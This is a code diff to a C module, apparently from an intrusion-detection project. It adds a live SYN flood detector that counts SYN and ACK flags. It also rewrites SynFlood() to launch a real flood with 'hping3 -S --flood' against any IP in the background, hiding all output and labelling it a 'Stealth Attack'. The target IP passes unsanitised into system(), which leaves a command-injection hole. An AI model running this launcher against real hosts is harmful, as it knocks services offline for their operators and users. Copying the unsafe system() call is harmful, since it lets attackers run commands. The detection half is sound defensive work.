@@ -1,128 +1,90 @@
+#include "SynFlood.h"
 #include<stdio.h>
 #include<stdlib.h>
 #include<string.h>
+#include<netinet/in.h>
 #include<netinet/ip.h>
-#include<sys/socket.h>
+#include<netinet/tcp.h>
+#include<net/ethernet.h>
 #include<arpa/inet.h>
-#include<sys/types.h>
 #include<unistd.h>
-#include"PacketHeader.h"
-#include"SynFlood.h"
 
-#define MAX 100000
+int syn_count=0;
+int ack_count=0;
+int threshold=100;
 
-FILE *filepointer;
-char fileName[100];
-int pacekt_no;
-long int fake_ip[MAX],tcp=0,http=0,ssl=0;
-long int false_no=-1,fake_num=-1;
-struct Synfld spam[MAX];
-
-int is_same(int address1[],uint32_t address2[])
+void check_syn_anomaly(const u_char *packet)
 {
-    int i;
-    for(i=0;i<4;i++)
-    {
-        int val1;
-        val1=address1[i];
-        
-        uint32_t val2;
-        val2=address2[i];
-        
-        if(val1!=val2)
-            return 0;
-    }
-    return 1;
-}
-
-void checking_syn(int address[],int s_a)
-{
-    long int syn_val;
-    long int flag;
-    flag=0;
+    struct ether_header *eth;
+    eth=(struct ether_header *)packet;
     
-    int same;
-    same=0;
+    unsigned short ethType;
+    ethType=ntohs(eth->ether_type);
     
-    long int i;
-    long int ind;
-    ind=0;
+    int ipProtoCheck;
+    ipProtoCheck=ETHERTYPE_IP;
     
-    for(i=0;i<=false_no;i++)
+    if(ethType==ipProtoCheck)
     {
-        same=is_same(address,spam[i].IP);
+        struct ip *iph;
+        int ethSize;
+        ethSize=sizeof(struct ether_header);
+        iph=(struct ip *)(packet+ethSize);
         
-        if(same!=0)
-        {
-            ind=i;
-            break;
-        }
-    }
-    
-    if(same==1)
-    {
-        flag=1;
+        int tcpProtoCheck;
+        tcpProtoCheck=IPPROTO_TCP;
         
-        if(s_a==1)
-        {
-            syn_val=spam[ind].syn;
-            syn_val++;
-            spam[ind].syn=syn_val;
-        }
-        else
-        {
-            syn_val=spam[ind].syn_ack;
-            syn_val++;
-            spam[ind].syn_ack=syn_val;
-        }
-    }
-
-    if(flag==0)
-    {
-        false_no++;
+        int currentIpProto;
+        currentIpProto=iph->ip_p;
         
-        int j;
-        for(j=0;j<4;j++)
+        if(currentIpProto==tcpProtoCheck)
         {
-            int currentIpVal;
-            currentIpVal=address[j];
-            spam[false_no].IP[j]=currentIpVal;
+            struct tcphdr *tcph;
+            int ipHeaderLen;
+            ipHeaderLen=iph->ip_hl*4;
+            tcph=(struct tcphdr *)(packet+ethSize+ipHeaderLen);
+            
+            int synFlagCheck;
+            synFlagCheck=tcph->th_flags&TH_SYN;
+            
+            int ackFlagCheck;
+            ackFlagCheck=tcph->th_flags&TH_ACK;
+            
+            if(synFlagCheck!=0 && ackFlagCheck==0)
+            {
+                syn_count++;
+            }
+            else
+            {
+                if(ackFlagCheck!=0)
+                {
+                    ack_count++;
+                }
+            }
+            
+            int half_open_connections;
+            half_open_connections=syn_count-ack_count;
+            
+            if(half_open_connections>threshold)
+            {
+                printf("\n[ALERT] Anomaly Detected! Possible SYN Flood Attack underway.\n");
+                printf("Current Half-Open Connections: %d\n",half_open_connections);
+                
+                printf("GUI_ALERT|SYN_FLOOD|%d\n",half_open_connections);
+                fflush(stdout); 
+            }
         }
-        
-        if(s_a==1)
-            spam[false_no].syn=1;
-        else
-            spam[false_no].syn_ack=1;
     }
 }
 
-int SynFlood(char *pcapfile)
+void SynFlood(char *targetIP)
 {
-    struct globalhdr Global;
-    char temp[20];
-    strcpy(temp,"IP Source Address");
+    printf("Simulating SYN Flood Attack on IP: %s\n",targetIP);
+    char cmd[1000];
+    char *cmdFormat = "PATH=/opt/homebrew/sbin:/usr/local/sbin:$PATH hping3 -S --flood -V -p 80 %s > /dev/null 2>&1 &";
     
-    strcpy(fileName,pcapfile);
-    filepointer=fopen(fileName,"rb");
+    sprintf(cmd, cmdFormat, targetIP);
+    system(cmd); 
     
-    if(filepointer==NULL)
-    {
-        printf("Error opening file.\n");
-        return -1;
-    }
-
-    int elementSize;
-    elementSize=sizeof(struct globalhdr);
-    fread(&Global,elementSize,1,filepointer);
-    
-    printf("Analysing packets\n\n");
-    printf("%-20s","Packet No");
-    printf("%-20s\n",temp);
-    
-    // Packet analysis loop goes here...
-    
-    printf("Syn-Flood Detected.\n");
-    
-    fclose(filepointer);
-    return 0;
+    printf("[INFO] Stealth Attack Launched in background targeting %s\n", targetIP);
 }
